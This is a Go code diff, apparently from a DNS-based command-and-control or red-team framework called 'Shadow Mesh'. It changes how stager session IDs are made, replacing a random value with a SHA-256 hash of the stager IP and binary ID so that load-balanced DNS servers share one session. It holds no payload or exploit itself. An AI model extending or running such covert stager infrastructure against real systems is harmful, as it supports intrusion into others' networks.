@@ -6,7 +6,9 @@ package main
 import (
 	"bytes"
 	"compress/gzip"
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -2001,6 +2003,19 @@ type StagerProgressRequest struct {
 	StagerIP    string `json:"stager_ip"`
 }
 
+// generateDeterministicStagerSessionID creates a consistent session ID based on stager IP + binary ID
+// This ensures all DNS servers generate the same session ID for the same stager deployment
+// Critical for Shadow Mesh: stager load-balances across multiple DNS servers
+func generateDeterministicStagerSessionID(stagerIP, clientBinaryID string) string {
+	// Hash stager IP + client binary ID to get deterministic session ID
+	data := fmt.Sprintf("%s|%s", stagerIP, clientBinaryID)
+	hash := sha256.Sum256([]byte(data))
+
+	// Use first 4 hex chars from hash (16 bits) - matches stg_XXXX format
+	hashHex := hex.EncodeToString(hash[:])
+	return fmt.Sprintf("stg_%s", hashHex[:4])
+}
+
 // handleStagerContact records when a stager makes first contact with a DNS server (from cache)
 // This does NOT create a new session - the session was already created when Master built the stager
 func (api *APIServer) handleStagerContact(w http.ResponseWriter, r *http.Request) {
@@ -2016,8 +2031,9 @@ func (api *APIServer) handleStagerContact(w http.ResponseWriter, r *http.Request
 	}
 
 	// Create a stager session when contact is made from cache
-	// Generate session ID matching the format used in cached sessions
-	sessionID := fmt.Sprintf("stg_%04x", rand.Intn(65536))
+	// Generate DETERMINISTIC session ID based on stager IP + binary ID
+	// This ensures all DNS servers use the same session ID for the same stager
+	sessionID := generateDeterministicStagerSessionID(req.StagerIP, req.ClientBinaryID)
 
 	// Get total chunks from the cached binary
 	chunkCount, err := api.db.GetCachedChunkCount(req.ClientBinaryID)
